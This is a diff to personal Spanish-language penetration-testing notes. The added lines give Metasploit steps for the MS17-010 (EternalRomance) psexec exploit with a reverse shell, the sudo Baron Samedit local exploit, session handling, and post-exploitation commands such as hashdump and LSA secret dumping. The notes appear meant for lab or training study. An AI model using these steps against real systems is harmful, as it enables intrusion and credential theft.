@@ -218,7 +218,10 @@ sqlmap -r post_request
 
 revshells.com —> phppentestmonkey —> shell /bin/bash
 
-Metasploid
+===================================
+MESTSAPLOID
+===================================
+/usr/share/metasploit-framework/
 
 msfconsole
 set rhosts
@@ -232,10 +235,20 @@ options  # para ver opciones requeridas
 setg RHOST ipmaquinavulnerar
 run #para correr se puede usar tambien el compando exploit
 
+Por ejemplo un ethernal romance:
+search ms17_010 -- detectamos en el nmap con sV que es un win 7 u 10
+exploit/windows/smb/ms17_010_psexec
+set LHOST ipmaquinalocal -- MUY IMPORTANTE PARA ABRIR LA SHELL REVERSE
+
+
+
 sessions (por si hacemos un ctrl + z para mandar al background la sesion)
 
 search multi/handler  --> para reverse shells en windows
+exploit/linux/local/sudo_baron_samedit --> para reverse shells en Linux
 
+sessions --> muestra la sesiones activas
+sessions -i 1 --> te mete en la primera
 
 WINDOWS
 
@@ -243,7 +256,9 @@ getuid —> ver usuario
 NT AUTORITY\SYSTEM —> USUARIO QUE CORRE LOS SERVICIOS
 shell —> cambiar a una shell normal y corriente
 ipconfig —> ver interfaces
-
+hashdump —> ver usuarios y hashes de passwords
+lsa_dump_sam —> nolose muy bien
+lsa_dump_secrets —> nolose muy bien
 
 ===================================
 APACHE
